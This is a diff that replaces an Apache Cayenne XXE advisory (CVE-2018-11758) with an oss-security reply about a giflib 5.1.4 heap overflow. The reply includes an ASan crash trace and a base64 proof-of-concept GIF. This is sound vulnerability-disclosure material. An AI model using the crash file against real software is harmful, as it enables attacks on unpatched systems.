@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1182" "Wednesday" "22" "August" "2018" "20:11:51" "+0300" "Andrus Adamchik" "aadamchik@apache.org" "<88FF8C3C-25BF-4A80-823D-9803E8394AE8@apache.org>" "38" "[oss-security] CVE-2018-11758: Apache Cayenne XXE Vulnerability in CayenneModeler GUI tool " nil nil nil "8" "2018082217:11:51" "[oss-security] CVE-2018-11758: Apache Cayenne XXE Vulnerability in CayenneModeler GUI tool" (number mark "U       aadamchik@ap Aug 22   38/1182  " thread-indent "\"[oss-security] CVE-2018-11758: Apache Cayenne XXE Vulnerability in CayenneModeler GUI tool \"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3791" "Tuesday" "13" "September" "2016" "18:50:06" "+0200" "Solar Designer" "solar@openwall.com" "<20160913165006.GA9055@openwall.com>" "97" "Re: [oss-security] Heapoverflow in giflib5.1.4" "^Cc:" nil nil "9" "2016091316:50:06" "[oss-security] Heapoverflow in giflib5.1.4" (number mark "        solar@openwa Sep 13   97/3791  " thread-indent "\"Re: [oss-security] Heapoverflow in giflib5.1.4\"\n") "<a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>" ("<a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 14120 invoked by uid 550); 22 Aug 2018 19:27:10 -0000
+Received: (qmail 5462 invoked by uid 550); 13 Sep 2016 17:08:45 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,75 +11,115 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 18291 invoked from network); 13 Sep 2016 16:50:13 -0000
+Message-ID: <20160913165006.GA9055@openwall.com>
+References: <a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>
+Mime-Version: 1.0
+Content-Type: multipart/mixed; boundary="gKMricLos+KVdGMg"
+Content-Disposition: inline
+In-Reply-To: <a3d8ebfe-9b67-997e-aaeb-5afe207ac97a@724safe.com>
+User-Agent: Mutt/1.4.2.3i
+Cc: oss-security@lists.openwall.com
+Date: Tue, 13 Sep 2016 18:50:06 +0200
+From: Solar Designer <solar@openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 24552 invoked from network); 22 Aug 2018 17:12:08 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
-	messagingengine.com; h=content-transfer-encoding:content-type
-	:date:from:message-id:mime-version:subject:to:x-me-sender
-	:x-me-sender:x-sasl-enc; s=fm3; bh=vzirbCv0ug3pbNjSMrFHsJfc3sZOK
-	LzuYTz9UFAziNg=; b=YQJk3tKT4zoDY24BogEJD9WzB1bLCUe8pBneZYKajb6i5
-	Agjhn2l7or5WnLSFUfLynIymgJgCPf0JWOYozLCVf0Kib3Ht8S0Z1X6dsjkjutAI
-	wjSMXJqrtvB47xsnOr18zvWzZ9urMeLO9nlirU6zB3/hZP7DEUUiGsnfD/lksKL0
-	Lg+BONhCzW4Zzi534sIswiwWD4qrl5+xvnQaq8vc3gcwzySxK+0rVEq7CP7EBADI
-	MFvBMI0kVm0m4doIp/GStgKJZJ/T6Xvsm+CLqYMGzNzrjzlpdUyOXtGfSBzDL3L7
-	lmiDcvrizAlWrzXux57FAZR3Cj+4wlFeV18RwwWRA==
-X-ME-Proxy: <xmx:Wpl9W6qDB0BNcmfFeKg4nu1LwlxEIhYFR5ap9_QFSA5Be4sBHfYlyw>
-    <xmx:Wpl9WwCRigk8J4cscRUBcdiaaWg5Hk8D4Nrhg93l2pJUQFqXObaxLQ>
-    <xmx:Wpl9W7MKtax0z99WhMvN7kPORPy3ukWF83xpSURPCJ8RZNhNRQhxvw>
-    <xmx:Wpl9Wzj1OzuJq9BSkD_UjCOyg6kqTd0X9ZQQ4hCHoaQaGZQhhqv0Rw>
-    <xmx:Wpl9WzSx2YNV5daxqwQzfzxm9ay0uyLXvjyH2oVnoRwK6HaakYogFw>
-    <xmx:Wpl9W6cyJLirHnSdvvVEaWZDZCcnYt0Bgywe-KTDK4a8f7xJJp9glw>
-X-ME-Sender: <xms:Wpl9W3MaJkDuhSMFC21kFib-aAneLBYhSVCq6Dj7xtWfFHxVM_ASTw>
-From: Andrus Adamchik <aadamchik@apache.org>
-Content-Type: text/plain;
-	charset=us-ascii
-Content-Transfer-Encoding: quoted-printable
-Mime-Version: 1.0 (Mac OS X Mail 11.5 \(3445.9.1\))
-Message-Id: <88FF8C3C-25BF-4A80-823D-9803E8394AE8@apache.org>
-Date: Wed, 22 Aug 2018 20:11:51 +0300
-To: user@cayenne.apache.org,
- dev@cayenne.apache.org,
- oss-security@lists.openwall.com,
- Apache Security Team <security@apache.org>
-X-Mailer: Apple Mail (2.3445.9.1)
-Subject: [oss-security] CVE-2018-11758: Apache Cayenne XXE Vulnerability in CayenneModeler
- GUI tool 
+Subject: Re: [oss-security] Heapoverflow in giflib5.1.4
+To: "vul @ 724safe" <vul@724safe.com>
 
-CVE-2018-11758: Apache Cayenne XXE Vulnerability in CayenneModeler GUI tool=
-=20
+--gKMricLos+KVdGMg
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
-Severity: Low
+On Tue, Sep 13, 2016 at 11:20:08PM +0800, vul @ 724safe wrote:
+> With Address Sanitizer there is aa heap overflow in giflib 5.1.4
+> More details are available at:
+> https://sourceforge.net/p/giflib/bugs/102/
 
-Vendor: The Apache Software Foundation
+When posting to oss-security, please include the actual detail right in
+your posting (up to 200 KB including MIME overhead, but of course try to
+keep it smaller than that if at all practical) - not only via external
+links.  I've attached the content of the above link now.  Luckily, this
+one PoC GIF file is tiny:
 
-Versions Affected:
-Cayenne 4.1.M1
-Cayenne 3.2.M1, 4.0.M2 to 4.0.M5, 4.0.B1, 4.0.B2, 4.0.RC1
-Cayenne 3.1, 3.1.1, 3.1.2
-The unsupported Cayenne 2.0.x, 3.0.x versions may be also affected
+$ base64 poc
+R0lGODdhKP9/AADZACwAHQAAKAAAAPngp5Lb5QAD4wAAAgAAOwAd
 
-Description:
-CayenneModeler is a desktop GUI tool for working with Cayenne ORM models st=
-ored as XML files.
-If an attacker tricks a user of CayenneModeler into opening a malicious XML=
- file, the attacker
-will be able to instruct the XML parser built into CayenneModeler to transf=
-er files from a local
-machine to a remote machine controlled by the attacker. The cause of the is=
-sue is XML=20
-parser processing XML External Entity (XXE) declarations included in XML. T=
-he vulnerability is
-addressed in Cayenne by disabling XXE processing in all operations that req=
-uire XML parsing.
+Ideally, you would also investigate and patch issues found by ASan,
+rather than merely include its output, but I realize we can't actually
+expect anything specific from volunteers.  So whatever we've got.
 
-Mitigation:
-4.1.x users should upgrade to 4.1.M2 or newer.
-4.0.x users should upgrade to 4.0 (GA release).
-3.1.x users should upgrade to 3.1.3.
+Thanks,
 
-References:=20
-https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing
+Alexander
 
----
-Andrus Adamchik
-Apache Cayenne PMC=
+--gKMricLos+KVdGMg
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="giflib-102-Heap_overflow_in_gif2rgb.c.txt"
+
+#102 Heap overflow in gif2rgb.c
+
+   Milestone: v1.0_(example)
+   Status: open
+   Owner: nobody
+   Labels: heap overflow (1)
+   Priority: 7
+   Updated: 2 hours ago
+   Created: 2 hours ago
+   Creator: STARLAB
+   Private: No
+
+   Hello,
+   There is a Heap-overflow in giflib 5.1.4. The crash output with asan is as follows:
+   ./util/gif2rgb poc
+   =================================================================
+   ==8885==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xf6200a3b at pc 0x80d317d bp 0xffce7d58 sp 0xffce7d50
+   READ of size 1 at 0xf6200a3b thread T0
+   #0 0x80d317c in DumpScreen2RGB /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:294
+   #1 0x80d1736 in GIF2RGB /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:474
+   #2 0x80cb9e2 in main /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:525
+   #3 0xf74b4af2 (/lib/i386-linux-gnu/libc.so.6+0x19af2)
+   #4 0x80ca7f4 in _start (/home/starlab/test-fuzzing/giflib-5.1.4/util/.libs/lt-gif2rgb+0x80ca7f4)
+
+   AddressSanitizer can not describe address in more detail (wild memory access suspected).
+   SUMMARY: AddressSanitizer: heap-buffer-overflow /home/starlab/test-fuzzing/giflib-5.1.4/util/gif2rgb.c:294 DumpScreen2RGB
+   Shadow bytes around the buggy address:
+   0x3ec400f0: fa fa 00 00 fa fa 00 04 fa fa 00 00 fa fa 03 fa
+   0x3ec40100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40110: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40120: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40130: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   =>0x3ec40140: fa fa fa fa fa fa fa[fa]fa fa fa fa fa fa fa fa
+   0x3ec40150: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40160: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   0x3ec40190: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+   Shadow byte legend (one shadow byte represents 8 application bytes):
+   Addressable: 00
+   Partially addressable: 01 02 03 04 05 06 07
+   Heap left redzone: fa
+   Heap right redzone: fb
+   Freed heap region: fd
+   Stack left redzone: f1
+   Stack mid redzone: f2
+   Stack right redzone: f3
+   Stack partial redzone: f4
+   Stack after return: f5
+   Stack use after scope: f8
+   Global redzone: f9
+   Global init order: f6
+   Poisoned by user: f7
+   ASan internal: fe
+   ==8885==ABORTING
+
+   The poc is in the attachment
+   The vulnerability is found by F4B3CD@STARLAB
+
+--gKMricLos+KVdGMg
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename=poc
+Content-Transfer-Encoding: base64
+
+R0lGODdhKP9/AADZACwAHQAAKAAAAPngp5Lb5QAD4wAAAgAAOwAd
+
+--gKMricLos+KVdGMg--
